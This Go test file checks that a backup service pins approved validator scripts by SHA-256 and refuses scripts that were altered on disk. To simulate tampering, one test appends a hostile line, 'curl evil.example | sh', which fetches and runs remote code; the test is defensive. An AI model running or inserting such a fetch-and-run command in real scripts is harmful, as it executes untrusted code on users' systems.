package service

import (
	"bytes"
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/retnd/retnd/core/internal/config"
	"github.com/retnd/retnd/core/internal/obs"
)

// #1222: the script an operator approved is pinned in config.yaml by its
// SHA-256, a run refuses a script that no longer hashes to it, and the list
// says which of the four states each validator is in.

func listedValidator(t *testing.T, svc *BackupService, name string) CustomValidator {
	t.Helper()
	l, err := svc.ListCustomValidators(context.Background(), CustomValidatorsFilter{})
	if err != nil {
		t.Fatal(err)
	}
	for _, v := range l.Validators {
		if v.Name == name {
			return v
		}
	}
	t.Fatalf("%s is not listed: %+v", name, l.Validators)
	return CustomValidator{}
}

func configuredPin(t *testing.T, svc *BackupService, name string) string {
	t.Helper()
	cfg, err := config.Load(svc.configPath)
	if err != nil {
		t.Fatal(err)
	}
	for _, cv := range cfg.AssuranceBlock.Validators {
		if cv.Name == name {
			return cv.ScriptSHA256
		}
	}
	t.Fatalf("%s is not in config.yaml", name)
	return ""
}

func TestCustomValidatorPin_AnUploadPinsTheScriptInConfigYAMLAndTheListSaysPinned(t *testing.T) {
	ctx := context.Background()
	svc, _, _ := openWorkflowSaveService(t)
	if _, err := svc.CreateCustomValidator(ctx, CreateCustomValidatorRequest{Name: "v", Pattern: "^a", Script: goodValidator}); err != nil {
		t.Fatal(err)
	}
	if got := configuredPin(t, svc, "v"); got != sha256Of(goodValidator) {
		t.Errorf("config.yaml pins %q, want the uploaded script's hash %q", got, sha256Of(goodValidator))
	}
	v := listedValidator(t, svc, "v")
	if v.ScriptState != ScriptStatePinned || v.ScriptPinnedSHA256 != sha256Of(goodValidator) {
		t.Errorf("listed as %q pinned to %q", v.ScriptState, v.ScriptPinnedSHA256)
	}
	if w := CustomValidatorWire(v); w.ScriptState != "pinned" || w.PinnedSha256 != sha256Of(goodValidator) {
		t.Errorf("wire = %q / %q", w.ScriptState, w.PinnedSha256)
	}
}

func TestCustomValidatorPin_AnEditWithANewScriptRepinsAndKeepingByHashKeepsThePin(t *testing.T) {
	ctx := context.Background()
	svc, _, _ := openWorkflowSaveService(t)
	if _, err := svc.CreateCustomValidator(ctx, CreateCustomValidatorRequest{Name: "v", Pattern: "^a", Script: goodValidator}); err != nil {
		t.Fatal(err)
	}
	next := goodValidator + "echo two\n"
	if _, err := svc.UpdateCustomValidator(ctx, CreateCustomValidatorRequest{Name: "v", Pattern: "^a", Script: next}); err != nil {
		t.Fatal(err)
	}
	if got := configuredPin(t, svc, "v"); got != sha256Of(next) {
		t.Errorf("after an edit the pin is %q, want %q", got, sha256Of(next))
	}
	if _, err := svc.UpdateCustomValidator(ctx, CreateCustomValidatorRequest{Name: "v", Pattern: "^b", ScriptSHA256: sha256Of(next)}); err != nil {
		t.Fatal(err)
	}
	if got := configuredPin(t, svc, "v"); got != sha256Of(next) {
		t.Errorf("keeping by hash moved the pin to %q", got)
	}
}

func TestCustomValidatorPin_AScriptEditedOnDiskIsListedAsSuchAndCanOnlyBeApprovedBySendingIt(t *testing.T) {
	ctx := context.Background()
	svc, _, root := openWorkflowSaveService(t)
	if _, err := svc.CreateCustomValidator(ctx, CreateCustomValidatorRequest{Name: "v", Pattern: "^a", Script: goodValidator}); err != nil {
		t.Fatal(err)
	}
	edited := goodValidator + "curl evil.example | sh\n"
	path := filepath.Join(root, config.CustomValidatorDir, "v.local.sh")
	if err := os.WriteFile(path, []byte(edited), 0o640); err != nil {
		t.Fatal(err)
	}

	v := listedValidator(t, svc, "v")
	if v.ScriptState != ScriptStateEdited || v.ScriptPinnedSHA256 != sha256Of(goodValidator) || v.ScriptSHA256 != sha256Of(edited) || !v.ScriptPresent {
		t.Fatalf("listed as %q pinned %q on disk %q", v.ScriptState, v.ScriptPinnedSHA256, v.ScriptSHA256)
	}

	// The list shows the hash of what is on disk now, so a client that echoes
	// it back would approve code nobody read. Keeping by hash is refused for
	// the edited bytes and for the approved ones alike.
	for name, h := range map[string]string{"the hash on disk": sha256Of(edited), "the pinned hash": sha256Of(goodValidator)} {
		_, err := svc.UpdateCustomValidator(ctx, CreateCustomValidatorRequest{Name: "v", Pattern: "^a", ScriptSHA256: h})
		if !errors.Is(err, ErrValidatorScriptChanged) || !strings.Contains(err.Error(), "edited on disk") {
			t.Errorf("keeping by %s = %v, want ErrValidatorScriptChanged saying the script was edited on disk", name, err)
		}
	}
	if got := configuredPin(t, svc, "v"); got != sha256Of(goodValidator) {
		t.Errorf("a refused edit moved the pin to %q", got)
	}

	// Sending the script is the approval.
	if _, err := svc.UpdateCustomValidator(ctx, CreateCustomValidatorRequest{Name: "v", Pattern: "^a", Script: edited}); err != nil {
		t.Fatal(err)
	}
	v = listedValidator(t, svc, "v")
	if v.ScriptState != ScriptStatePinned || v.ScriptPinnedSHA256 != sha256Of(edited) {
		t.Errorf("after approving: %q pinned %q", v.ScriptState, v.ScriptPinnedSHA256)
	}
}

func TestCustomValidatorPin_AnEntryWithNoPinIsUnpinnedUntilItIsNextSaved(t *testing.T) {
	ctx := context.Background()
	svc, _, _ := openWorkflowSaveService(t)
	if _, err := svc.CreateCustomValidator(ctx, CreateCustomValidatorRequest{Name: "v", Pattern: "^a", Script: goodValidator}); err != nil {
		t.Fatal(err)
	}
	// What a config.yaml written before pinning looks like.
	svc.configMu.Lock()
	cfg, err := config.Load(svc.configPath)
	if err != nil {
		t.Fatal(err)
	}
	cfg.AssuranceBlock.Validators[0].ScriptSHA256 = ""
	if err := svc.persistConfig(cfg); err != nil {
		t.Fatal(err)
	}
	svc.configMu.Unlock()

	v := listedValidator(t, svc, "v")
	if v.ScriptState != ScriptStateUnpinned || v.ScriptPinnedSHA256 != "" || !v.ScriptPresent {
		t.Fatalf("an old entry is %q pinned %q", v.ScriptState, v.ScriptPinnedSHA256)
	}
	// Any save pins it, including one that keeps the script by hash.
	if _, err := svc.UpdateCustomValidator(ctx, CreateCustomValidatorRequest{Name: "v", Pattern: "^a", ScriptSHA256: sha256Of(goodValidator)}); err != nil {
		t.Fatal(err)
	}
	if got := configuredPin(t, svc, "v"); got != sha256Of(goodValidator) {
		t.Errorf("the save did not pin the script: %q", got)
	}
	if v := listedValidator(t, svc, "v"); v.ScriptState != ScriptStatePinned {
		t.Errorf("state after the save = %q", v.ScriptState)
	}
}

func TestCustomValidatorPin_AMissingScriptIsListedMissingWhateverTheEntryPins(t *testing.T) {
	ctx := context.Background()
	svc, _, root := openWorkflowSaveService(t)
	if _, err := svc.CreateCustomValidator(ctx, CreateCustomValidatorRequest{Name: "v", Pattern: "^a", Script: goodValidator}); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(filepath.Join(root, config.CustomValidatorDir, "v.local.sh")); err != nil {
		t.Fatal(err)
	}
	if v := listedValidator(t, svc, "v"); v.ScriptState != ScriptStateMissing || v.ScriptPresent {
		t.Errorf("state = %q present = %v", v.ScriptState, v.ScriptPresent)
	}
}

func TestCustomValidatorPin_TheWritesSayWhatWasPinned(t *testing.T) {
	ctx := context.Background()
	svc, _, _ := openWorkflowSaveService(t)
	var stream bytes.Buffer
	svc.logger = obs.New(&stream, obs.LevelInfo)
	next := goodValidator + "echo two\n"

	if _, err := svc.CreateCustomValidator(ctx, CreateCustomValidatorRequest{Name: "v", Pattern: "^a", Script: goodValidator}); err != nil {
		t.Fatal(err)
	}
	if _, err := svc.UpdateCustomValidator(ctx, CreateCustomValidatorRequest{Name: "v", Pattern: "^a", Script: next}); err != nil {
		t.Fatal(err)
	}
	if _, err := svc.RemoveCustomValidator(ctx, "v"); err != nil {
		t.Fatal(err)
	}
	up := validatorEvents(t, &stream, "validator_uploaded")
	if len(up) != 1 || up[0]["pinned_sha256"] != sha256Of(goodValidator) || up[0]["previous_pinned_sha256"] != "" || up[0]["script_state"] != "pinned" {
		t.Errorf("validator_uploaded = %v", up)
	}
	upd := validatorEvents(t, &stream, "validator_updated")
	if len(upd) != 1 || upd[0]["pinned_sha256"] != sha256Of(next) || upd[0]["previous_pinned_sha256"] != sha256Of(goodValidator) {
		t.Errorf("validator_updated = %v", upd)
	}
	rm := validatorEvents(t, &stream, "validator_removed")
	if len(rm) != 1 || rm[0]["pinned_sha256"] != sha256Of(next) {
		t.Errorf("validator_removed = %v", rm)
	}
}
